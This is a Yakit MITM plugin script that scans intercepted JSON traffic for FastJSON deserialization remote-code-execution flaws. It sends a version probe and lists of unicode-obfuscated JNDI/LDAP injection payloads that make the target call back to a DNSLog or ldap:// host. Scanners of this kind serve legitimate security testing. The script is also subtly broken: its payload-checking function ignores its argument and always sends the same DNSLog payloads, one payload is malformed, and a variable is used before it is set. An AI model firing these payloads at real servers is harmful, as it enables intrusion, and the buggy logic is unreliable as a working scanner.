# mitm plugin template

#--------------------------WORKSPACE-----------------------------
__test__ = func() {
    results, err := yakit.GenerateYakitMITMHooksParams("GET", "http://123.58.224.8:36870/")
    if err != nil {
        
        return

    }
    isHttps, url, reqRaw, rspRaw, body = results
    mirrorNewWebsitePath(results...)
}

highVersionPayload = [`{"{{randstr(2)}}":{"\u0040\u0074\u0079\u0070\u0065":"\u006F\u0072\u0067\u002E\u0061\u0070\u0061\u0063\u0068\u0065\u002E\u0069\u0062\u0061\u0074\u0069\u0073\u002E\u0064\u0061\u0074\u0061\u0073\u006F\u0075\u0072\u0063\u0065\u002E\u006A\u006E\u0064\u0069\u002E\u004A\u006E\u0064\u0069\u0044\u0061\u0074\u0061\u0053\u006F\u0075\u0072\u0063\u0065\u0046\u0061\u0063\u0074\u006F\u0072\u0079","\u0070\u0072\u006F\u0070\u0065\u0072\u0074\u0069\u0065\u0073":{"\u0064\u0061\u0074\u0061\u005F\u0073\u006F\u0075\u0072\u0063\u0065":"{{params(reverseConnTarget)}}"}}}`, `{"{{randstr(2)}}":{"\u0040\u0074\u0079\u0070\u0065":"\u006F\u0072\u0067\u002E\u0061\u0070\u0061\u0063\u0068\u0065\u002E\u0078\u0062\u0065\u0061\u006E\u002E\u0070\u0072\u006F\u0070\u0065\u0072\u0074\u0079\u0065\u0064\u0069\u0074\u006F\u0072\u002E\u004A\u006E\u0064\u0069\u0043\u006F\u006E\u0076\u0065\u0072\u0074\u0065\u0072","\u0041\u0073\u0054\u0065\u0078\u0074":"{{params(reverseConnTarget)}}"}}`, `{"{{randstr(2)}}":{"\u0040\u0074\u0079\u0070\u0065":"\u006F\u0072\u0067\u002E\u0061\u0070\u0061\u0063\u0068\u0065\u002E\u0073\u0068\u0069\u0072\u006F\u002E\u006A\u006E\u0064\u0069\u002E\u004A\u006E\u0064\u0069\u004F\u0062\u006A\u0065\u0063\u0074\u0046\u0061\u0063\u0074\u006F\u0072\u0079","\u0072\u0065\u0073\u006F\u0075\u0072\u0063\u0065\u004E\u0061\u006D\u0065":"{{params(reverseConnTarget)}}"}}`, `{"{{randstr(2)}}":{"\u0040\u0074\u0079\u0070\u0065":"\u0062\u0072\u002E\u0063\u006F\u006D\u002E\u0061\u006E\u0074\u0065\u0072\u006F\u0073\u002E\u0064\u0062\u0063\u0070\u002E\u0041\u006E\u0074\u0065\u0072\u006F\u0073\u0044\u0042\u0043\u0050\u0043\u006F\u006E\u0066\u0069\u0067","\u006D\u0065\u0074\u0072\u0069\u0063\u0052\u0065\u0067\u0069\u0073\u0074\u0072\u0079":"{{params(reverseConnTarget)}}"}`, `{"{{randstr(2)}}":{"\u0040\u0074\u0079\u0070\u0065":"\u006F\u0072\u0067\u002E\u0061\u0070\u0061\u0063\u0068\u0065\u002E\u0069\u0067\u006E\u0069\u0074\u0065\u002E\u0063\u0061\u0063\u0068\u0065\u002E\u006A\u0074\u0061\u002E\u006A\u006E\u0064\u0069\u002E\u0043\u0061\u0063\u0068\u0065\u004A\u006E\u0064\u0069\u0054\u006D\u004C\u006F\u006F\u006B\u0075\u0070","\u006A\u006E\u0064\u0069\u004E\u0061\u006D\u0065\u0073":"{{params(reverseConnTarget)}}"}}}`, `{"{{randstr(2)}}":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006F\u006D\u002E\u0069\u0062\u0061\u0074\u0069\u0073\u002E\u0073\u0071\u006C\u006D\u0061\u0070\u002E\u0065\u006E\u0067\u0069\u006E\u0065\u002E\u0074\u0072\u0061\u006E\u0073\u0061\u0063\u0074\u0069\u006F\u006E\u002E\u006A\u0074\u0061\u002E\u004A\u0074\u0061\u0054\u0072\u0061\u006E\u0073\u0061\u0063\u0074\u0069\u006F\u006E\u0043\u006F\u006E\u0066\u0069\u0067","\u0070\u0072\u006F\u0070\u0065\u0072\u0074\u0069\u0065\u0073":{"\u0040\u0074\u0079\u0070\u0065":"\u006A\u0061\u0076\u0061\u002E\u0075\u0074\u0069\u006C\u002E\u0070\u0072\u006F\u0070\u0065\u0072\u0074\u0069\u0065\u0073","\u0055\u0073\u0065\u0072\u0054\u0072\u0061\u006E\u0073\u0061\u0063\u0074\u0069\u006F\u006E":"{{params(reverseConnTarget)}}"}}}`]
dnslogPayloads = [`{"{{randstr(2)}}":{"\u0040\u0074\u0079\u0070\u0065":"\u006A\u0061\u0076\u0061\u002E\u006E\u0065\u0074\u002E\u0049\u006E\u0065\u0074\u0053\u006F\u0063\u006B\u0065\u0074\u0041\u0064\u0064\u0072\u0065\u0073\u0073"{"\u0061\u0064\u0064\u0072\u0065\u0073\u0073":,"\u0076\u0061\u006C":"{{params(reverseConnTarget)}}"}}}`, `{"{{randstr(2)}}":{"\u0040\u0074\u0079\u0070\u0065":"\u006A\u0061\u0076\u0061\u002E\u006E\u0065\u0074\u002E\u0049\u006E\u0065\u0074\u0034\u0041\u0064\u0064\u0072\u0065\u0073\u0073","\u0076\u0061\u006C":"{{params(reverseConnTarget)}}"}}`]
nextPayload = [`{"{{randstr(2)}}":{"\u0040\u0074\u0079\u0070\u0065":"java.lang.Class","\u0076\u0061\u006C":"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C"},"{{randstr(2)}}":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C","\u0064\u0061\u0074\u0061\u0053\u006F\u0075\u0072\u0063\u0065\u004E\u0061\u006D\u0065":"{{params(reverseConnTarget)}}","\u0061\u0075\u0074\u006F\u0043\u006F\u006D\u006D\u0069\u0074":true}}`, `{"\u0040\u0074\u0079\u0070\u0065":"[\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C"[,,,{,,,"\u0064\u0061\u0074\u0061\u0053\u006F\u0075\u0072\u0063\u0065\u004E\u0061\u006D\u0065":"{{params(reverseConnTarget)}}", "\u0061\u0075\u0074\u006F\u0043\u006F\u006D\u006D\u0069\u0074":true}`]

checkFastjsonVersion = `{"\u0040\u0074\u0079\u0070\u0065":"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0041\u0075\u0074\u006f\u0043\u006c\u006f\u0073\u0065\u0061\u0062\u006c\u0065"}`
fastJsonCount = 0
lock = sync.NewLock()
addTask = func() {
    lock.Lock()
    defer lock.Unlock()

    fastJsonCount++
    yakit_status("FastJSON 检查任务", sprint(fastJsonCount))
}

subTask = func() {
    lock.Lock()
    defer lock.Unlock()

    fastJsonCount--
    if fastJsonCount > 0 {
        yakit_status("FastJSON 检查任务", sprint(fastJsonCount))
    }else{
        yakit_status("FastJSON 检查任务", "暂无执行中")
    }
}
NewThreadPool = func(size){
    inputChan = make(chan var)
    var consumer
    consumerWG = sync.NewWaitGroup()
    productorWG = sync.NewWaitGroup()
    threadPool = {
        "consumer":f =>{
            consumer = (id,data)=>{
                try {
                    f(id, data)
                } catch err {
                    log.warn("run consumer error: %v"%err)
                }
            }
            return threadPool
        },
        "productor":f=>{
            productorWG.Add(1)
            go fn{
                try {
                    f(inputChan)    
                } catch err {
                    log.warn("run productor error: %v"%err)
                }
                productorWG.Done()
            }
            return threadPool
        },
        "start":()=>{
            for id = range size{
                consumerWG.Add(1)
                go func(id){
                    for data in inputChan{
                        if consumer{
                            consumer(id,data)
                        }else{
                            log.warn("not set consumer for data: %v"%data)
                        }
                    }
                    consumerWG.Done()
                }(id)
            }
            return threadPool
        },
        "wait":()=>{
            productorWG.wait()
            close(inputChan)
            consumerWG.wait()
        }
    }
    return threadPool
}

mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    // 过滤请求
    reqIsJson = str.MatchAllOfRegexp(string(req), `(?i)Content-Type: (.*?)json`)
    rspIsJson = str.MatchAllOfRegexp(string(rsp), `(?i)Content-Type: (.*?)json`)
    if !reqIsJson && !rspIsJson {
        return
    }

    yakit.Info("发现Json，开始针对%v检测 FastJSON", url)
    // 检测数量提示
    addTask()
    defer subTask()
    defer func {
        err = recover()
        if err != nil {
            log.error("MITM FastJSON ERROR: %v", err)
        }
    }

    
    host, port, err = str.ParseStringToHostPort(url)
    addr = str.HostPort(host, port)

    // 构建fuzz request对象
    freq,err = fuzz.HTTPRequest(req, fuzz.https(isHttps))
    if err != nil {
        yakit.Error("构建 FastJSON 请求失败：%v", err)
        return
    }

    // 检测FastJSON版本
    bypassNextPayload = false
    freqResult ,err = freq.FuzzPostRaw(checkFastjsonVersion /*type: ...string*/).ExecFirst(httpool.https(isHttps))
    if err == nil{
        version = re.Grok(string(freqResult.ResponseRaw), `fastjson-version %{COMMONVERSION:version}`)["version"]
        if version != undefined {
            yakit.Info("检测 FastJSON 版本为：%v", version)
            risk.NewRisk(
                addr,
                risk.type("dnslog version"), risk.level("low"),
                risk.title(sprintf("FastJSON 版本检测: %v", version)),
                risk.titleVerbose(sprintf("FastJSON 版本检测: %v", version)),
                risk.request(freqResult.RequestRaw),
                risk.response(freqResult.ResponseRaw),
                risk.details({
                    "request": freqResult.RequestRaw,
                    "response": freqResult.ResponseRaw,
                }),
            )
            data = str.Split(version, ".")
            if len(data)>=3{
                data = data[2]
                if parseInt(data) > 43 {
                    bypassNextPayload = true
                }
            }
        }
    }

    // 创建线程池，并拿到inputChan
    func sendPayload(payloadRaw,isDnslog){
        domain, token, err = risk.NewDNSLogDomain()// "ldap://127.0.0.1:123/123"
        if err != nil {
            yakit.Info(sprintf("获取DNSLog失败: %s", err))
            return false
        }
        var reverseConnTarget
        if isDnslog{
            reverseConnTarget = domain
        }else{
            reverseConnTarget = sprintf("ldap://%v/%v", domain, str.RandStr(10))
        }
        unicodeReverseConnTarget = ""
        for i = 0; i < len(reverseConnTarget); i+=1{
            unicodeReverseConnTarget += str.Replace(sprintf("%U", reverseConnTarget[i]), "U+", "\\u", 1)
        }
        // 生成payload
        payload = fuzz.StringsWithParam(payloadRaw, {"reverseConnTarget":unicodeReverseConnTarget})[0]
        yakit.Info(sprintf("发送payload: %s",payload))
        freq = freq.FuzzMethod("POST").FuzzHTTPHeader("Content-Type", "application/json").FuzzPostRaw(payload)
        res, err = freq.Exec(httpool.https(isHttps), httpool.size(1))
        for result = range res {
            results, err = risk.CheckDNSLogByToken(token)
            if err != nil {
                continue
            }
            if len(results) > 0 {
                return true,result,token,domain
            }
        }
        return false
    }
    func checkPayloads(payloads){
        n = payloads.Length()
        if n > 20{
            n = 20
        }
        resultChan = make(chan var,len(payloads)) 
        pool = NewThreadPool(n)
        pool.consumer((id,data)=>{
            res = sendPayload(data...)
            ok = res[0]
            if ok{
                resultChan <- {"payload":data[0],"fuzzInfo":res[1],"token":res[2],"domain":res[3]}
            }
        }).start()
        pool.productor(c=>{
            for _,dnslogPayload = range dnslogPayloads{
                c <- [dnslogPayload,true]
            }
        })
        
        pool.wait()

        close(resultChan)
        riskInfos = []
        for data in resultChan{
            riskInfos.Append(data)
        }
        return riskInfos
    }
    
    func reportRisk(level,data){
        if data.Length() == 0{
            return
        }
        payloads =[]
        data.Map(d=>{
            payloads.Append(d["payload"])
        })
        d = data[0]
        risk.NewRisk(
            addr, risk.payload(str.Join(payloads, "\r\n")),
            risk.type("rce"), risk.level(level),
            risk.title(sprintf("FastJSON RCE via DNSLog: %v", addr)),
            risk.titleVerbose(sprintf("FastJSON 远程命令执行(DNSLog): %v", addr)),
            risk.request(d["fuzzInfo"].RequestRaw),
            risk.response(d["fuzzInfo"].ResponseRaw),
            risk.details({
                "request": d["fuzzInfo"].RequestRaw,
                "response": d["fuzzInfo"].ResponseRaw,
                "token": d["token"],
                "domain": d["domain"],
            }),
            risk.token(d["token"]),
        )
    }


    var riskCache
    yakit.Info("开始DNSLog检测")
    middleRisk = checkPayloads(dnslogPayloads)
    // 如果不是高版本而且有Dnslog回显，那就测试低版本Payload
    if !bypassNextPayload && middleRisk.Length()>0{
        riskCache = ["middle",highRisk]
        yakit.Info("发现Dnslog回显，继续检测JNDI利用")
        highRisk = checkPayloads(nextPayload)
        if highRisk.Length()>0{
            yakit.Info(f"目标: ${addr} 发现可利用Payload")
            reportRisk("critical",highRisk)
            return
        }
    }
    // 如果没有检测到利用链，继续测试高版本Payload
    highRisk = checkPayloads(highVersionPayload)
    if highRisk.Length() >0 {
        yakit.Info(f"目标: ${addr} 发现可利用Payload")
        reportRisk("critical",highRisk)
        return
    }else{
        // 如果还没有检测到利用链，那如果有Dnslog回显则报告
        if riskCache != nil{
            reportRisk(riskCache...)
        }else{
            yakit.Info(f"目标: ${addr} 未发现漏洞")
        }
    }
}
